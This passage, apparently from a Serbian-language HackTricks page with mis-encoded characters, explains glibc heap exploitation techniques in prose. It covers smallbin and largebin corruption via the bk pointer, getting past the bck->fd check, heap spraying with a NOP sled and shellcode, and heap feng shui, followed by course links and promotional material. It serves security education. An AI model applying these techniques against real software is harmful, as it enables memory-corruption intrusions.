OsloboÄ‘eni delovi se ubacuju u bin u zavisnosti od njihove veliÄine. Ali pre nego Å¡to se ubace, Äuvaju se u unsorted bins. Deo koji je osloboÄ‘en ne ide odmah u svoj bin veÄ‡ ostaje u unsorted bins. Zatim, ako se rezerviÅ¡e novi deo i prethodno osloboÄ‘eni moÅ¾e posluÅ¾iti, vraÄ‡a se, ali ako se rezerviÅ¡e veÄ‡i deo, osloboÄ‘eni deo u unsorted bins se stavlja u odgovarajuÄ‡i bin.

Da bi se doÅ¡lo do ranjivog koda, zahtev za memorijom mora biti veÄ‡i od av->max\_fast (obiÄno 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuÄ‡e veliÄine za zahtev, on se vraÄ‡a nakon Å¡to se odveÅ¾e:

bck = victim->bk; Pokazuje na prethodni deo, to je jedina informacija koju moÅ¾emo promeniti.

bin->bk = bck; Pretposlednji deo postaje poslednji, ako bck pokazuje na stek, sledeÄ‡em rezervisanom delu Ä‡e biti dodeljena ova adresa

bck->fd = bin; Zatvara se lista tako Å¡to ovaj pokazuje na bin

Potrebno je:
RezerviÅ¡u se dva malloc-a, tako da se prvi moÅ¾e preplaviti nakon Å¡to je drugi osloboÄ‘en i ubaÄen u svoj bin (tj. rezervisan je malloc veÄ‡i od drugog dela pre prelivanja)

Malloc rezervisan za adresu koju odabere napadaÄ mora biti pod kontrolom napadaÄa.

Cilj je sledeÄ‡i, ako moÅ¾emo preplaviti heap koji ima osloboÄ‘en deo ispod i u svom binu, moÅ¾emo promeniti njegov pokazivaÄ bk. Ako promenimo pokazivaÄ bk i taj deo postane prvi na listi binova i rezervisan je, bin Ä‡e biti prevaren i reÄ‡i Ä‡e mu se da je sledeÄ‡i deo liste (sledeÄ‡i koji se nudi) na laÅ¾noj adresi koju smo postavili (na stack ili GOT na primer). Dakle, ako se rezerviÅ¡e joÅ¡ jedan deo i napadaÄ ima dozvole na njemu, dobiÄ‡e deo na Å¾eljenoj poziciji i moÄ‡i Ä‡e da piÅ¡e u njega.

Nakon Å¡to se modifikovani deo oslobodi, potrebno je rezervisati deo veÄ‡i od osloboÄ‘enog, tako da modifikovani deo izaÄ‘e iz unsorted binova i ubaci se u svoj bin.

Kada je u svom binu, vreme je da se promeni pokazivaÄ bk preko prelivanja kako bi pokazivao na adresu koju Å¾elimo da prepisujemo.

Dakle, bin mora da saÄeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako Å¡to Ä‡e mu se reÄ‡i da je sledeÄ‡i deo na laÅ¾noj adresi. Zatim Ä‡e biti dat deo koji nas zanima.

Da bi se ranjivost izvrÅ¡ila Å¡to je pre moguÄ‡e, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji Ä‡e se modifikovati, osloboÄ‘enje ovog dela, rezervacija dela veÄ‡eg od onog koji Ä‡e se modifikovati, modifikacija dela (ranjivost), rezervacija dela iste veliÄine kao ranjivi deo i rezervacija drugog dela iste veliÄine koji Ä‡e pokazivati na odabranu adresu.

Za zaÅ¡titu od ovog napada koristi se tipiÄna provera da deo "nije" laÅ¾an: proverava se da li bck->fd pokazuje na Å¾rtvu. Drugim reÄima, u naÅ¡em sluÄaju, ako pokazivaÄ fd* laÅ¾nog dela pokazuje na Å¾rtvu na stacku. Da bi prevaziÅ¡ao ovu zaÅ¡titu, napadaÄ bi trebalo nekako da bude u moguÄ‡nosti da napiÅ¡e (verovatno preko stacka) na odgovarajuÄ‡u adresu adresu Å¾rtve. Tako Ä‡e izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre, plus neki dodatni, osim toga, rezervisani delovi moraju biti veÄ‡i od 512.

Napad je kao i prethodni, tj. treba promeniti pokazivaÄ bk i potrebni su svi ti pozivi malloc(), ali takoÄ‘e treba promeniti veliÄinu modifikovanog dela tako da taj size - nb bude < MINSIZE.

Na primer, treba postaviti size na 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne sme biti negativno jer se uporeÄ‘uje sa unsigned)

TakoÄ‘e je uveden zakrpa da bi se to uÄinilo joÅ¡ komplikovanijim.

**Heap Spraying**

Osnovna ideja je rezervisati Å¡to je viÅ¡e moguÄ‡e memorije za heap-ove i popuniti ih jastukom od nopsa zavrÅ¡enim shellcode-om. TakoÄ‘e se koristi 0x0c kao jastuk. PokuÅ¡aÄ‡e se skoÄiti na adresu 0x0c0c0c0c, pa ako se neka adresa prepisuje sa ovim jastukom, skoÄiÄ‡e tamo. Osnovna taktika je rezervisati Å¡to je viÅ¡e moguÄ‡e kako bi se videlo da li se prepisuje neki pokazivaÄ i skoÄiti na 0x0c0c0c0c u nadi da Ä‡e tamo biti nops.

**Heap Feng Shui**

Sastoji se u cementiranju memorije putem rezervacija i osloboÄ‘enja kako bi se ostavili rezervisani delovi izmeÄ‘u slobodnih delova. Bafer za prelivanje Ä‡e se nalaziti u jednom od tih delova.

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
